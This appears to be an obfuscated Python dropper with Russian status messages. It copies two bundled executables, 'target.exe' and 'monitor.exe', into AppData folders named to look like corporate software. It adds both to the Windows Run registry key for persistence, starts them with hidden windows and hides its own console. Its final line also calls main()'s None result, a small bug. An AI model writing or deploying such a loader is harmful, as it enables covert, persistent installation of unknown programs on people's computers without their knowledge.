import os as _Q5r9M2t3J7k1V_
import sys as _S8v3K9p2T4m7Q_
import winreg as _W4n9T2k3V8p1R_
import subprocess as _D9k4N3v7P2t8R_
import shutil as _H7q2P9v4K3m8T_
import importlib.resources as _R6p3K9v2T8m4Q_

_F7N2Q9K3T8V4_dispatch = {}

def _R8T3P2V9K4M1_(_n, _f): _F7N2Q9K3T8V4_dispatch[_n] = _f

def _Z9K3Q7V2X8M4P1T6N2_(_r):
    def _N5T2P9R3V7K1_():
        if hasattr(_S8v3K9p2T4m7Q_, '_MEIPASS'):
            return _Q5r9M2t3J7k1V_.path.join(_S8v3K9p2T4m7Q_._MEIPASS, _r)
        return _r
    return _N5T2P9R3V7K1_()
_R8T3P2V9K4M1_('get_resource_path', _Z9K3Q7V2X8M4P1T6N2_)

def _C4V9T3K2P8M7Q1N5_():
    def _J7K2P9V3T8M4Q1N6_():
        _t6K3V9P2T8M7_dir = _Q5r9M2t3J7k1V_.path.expanduser("~/AppData/Roaming/MyCorporateApp")
        _m5K9V2T3P8M7_dir = _Q5r9M2t3J7k1V_.path.expanduser("~/AppData/Roaming/MyCorporateMonitor")
        _t4K9V2T3M8Q7_path = _Q5r9M2t3J7k1V_.path.join(_t6K3V9P2T8M7_dir, "target.exe")
        _m3K9V2T8P7M4_path = _Q5r9M2t3J7k1V_.path.join(_m5K9V2T3P8M7_dir, "monitor.exe")
        
        _Q5r9M2t3J7k1V_.makedirs(_t6K3V9P2T8M7_dir, exist_ok=True)
        _Q5r9M2t3J7k1V_.makedirs(_m5K9V2T3P8M7_dir, exist_ok=True)
        
        try:
            _s3K9V2T8P7M4_target = _F7N2Q9K3T8V4_dispatch['get_resource_path']("target.exe")
            if not _Q5r9M2t3J7k1V_.path.exists(_s3K9V2T8P7M4_target):
                raise FileNotFoundError("Встроенный target.exe не найден")
            _H7q2P9v4K3m8T_.copy2(_s3K9V2T8P7M4_target, _t4K9V2T3M8Q7_path)
            print(f"target.exe скопирован в {_t4K9V2T3M8Q7_path}")
        except Exception as _e:
            print(f"Ошибка при копировании target.exe: {str(_e)}")
            _S8v3K9p2T4m7Q_.exit(1)
        
        try:
            _s3K9V2T8P7M4_monitor = _F7N2Q9K3T8V4_dispatch['get_resource_path']("monitor.exe")
            if not _Q5r9M2t3J7k1V_.path.exists(_s3K9V2T8P7M4_monitor):
                raise FileNotFoundError("Встроенный monitor.exe не найден")
            _H7q2P9v4K3m8T_.copy2(_s3K9V2T8P7M4_monitor, _m3K9V2T8P7M4_path)
            print(f"monitor.exe скопирован в {_m3K9V2T8P7M4_path}")
        except Exception as _e:
            print(f"Ошибка при копировании monitor.exe: {str(_e)}")
            _S8v3K9p2T4m7Q_.exit(1)
        
        return _t6K3V9P2T8M7_dir, _t4K9V2T3M8Q7_path, _m5K9V2T3P8M7_dir, _m3K9V2T8P7M4_path
    return _J7K2P9V3T8M4Q1N6_()
_R8T3P2V9K4M1_('copy_exe_to_target_dir', _C4V9T3K2P8M7Q1N5_)

def _X7Q2P9V4K3T8M1N6_(_p, _n):
    def _F5K9T2V3P8M7Q1N4_():
        try:
            _k6T3P9V2K8M4_ = _W4n9T2k3V8p1R_.OpenKey(
                _W4n9T2k3V8p1R_.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                _W4n9T2k3V8p1R_.KEY_SET_VALUE
            )
            _W4n9T2k3V8p1R_.SetValueEx(_k6T3P9V2K8M4_, _n, 0, _W4n9T2k3V8p1R_.REG_SZ, f'"{_p}"')
            _W4n9T2k3V8p1R_.CloseKey(_k6T3P9V2K8M4_)
            print(f"{_n} добавлен в автозагрузку")
        except Exception as _e:
            print(f"Ошибка при добавлении {_n} в автозагрузку: {str(_e)}")
            _S8v3K9p2T4m7Q_.exit(1)
    return _F5K9T2V3P8M7Q1N4_()
_R8T3P2V9K4M1_('add_to_startup', _X7Q2P9V4K3T8M1N6_)

def _P8K3V9T2Q7M4N1R6_(_p):
    def _G4T9K2V3P8M7Q1N5_():
        try:
            _s7K3P9V2T8M4_info = _D9k4N3v7P2t8R_.STARTUPINFO()
            _s7K3P9V2T8M4_info.dwFlags |= _D9k4N3v7P2t8R_.STARTF_USESHOWWINDOW
            _s7K3P9V2T8M4_info.wShowWindow = _D9k4N3v7P2t8R_.SW_HIDE
            _D9k4N3v7P2t8R_.Popen(_p, startupinfo=_s7K3P9V2T8M4_info)
            print(f"Программа {_p} запущена в фоновом режиме")
        except Exception as _e:
            print(f"Ошибка при запуске {_p}: {str(_e)}")
            _S8v3K9p2T4m7Q_.exit(1)
    return _G4T9K2V3P8M7Q1N5_()
_R8T3P2V9K4M1_('run_exe_hidden', _P8K3V9T2Q7M4N1R6_)

def _R2T9P4K3V8M7_main():
    def _N3K7Q2P9V4T8M1_():
        if hasattr(_S8v3K9p2T4m7Q_, 'frozen'):
            import ctypes as _C9T3K7V2P8M4Q_
            _C9T3K7V2P8M4Q_.windll.user32.ShowWindow(_C9T3K7V2P8M4Q_.windll.kernel32.GetConsoleWindow(), 0)
        
        _t6K3V9P2T8M7_dir, _t4K9V2T3M8Q7_path, _m5K9V2T3P8M7_dir, _m3K9V2T8P7M4_path = _F7N2Q9K3T8V4_dispatch['copy_exe_to_target_dir']()
        
        _F7N2Q9K3T8V4_dispatch['add_to_startup'](_t4K9V2T3M8Q7_path, "MyCorporateApp")
        _F7N2Q9K3T8V4_dispatch['add_to_startup'](_m3K9V2T8P7M4_path, "MyCorporateMonitor")
        
        _F7N2Q9K3T8V4_dispatch['run_exe_hidden'](_t4K9V2T3M8Q7_path)
        _F7N2Q9K3T8V4_dispatch['run_exe_hidden'](_m3K9V2T8P7M4_path)
    return _N3K7Q2P9V4T8M1_()

if __name__ == '__main__':
    _R2T9P4K3V8M7_main()()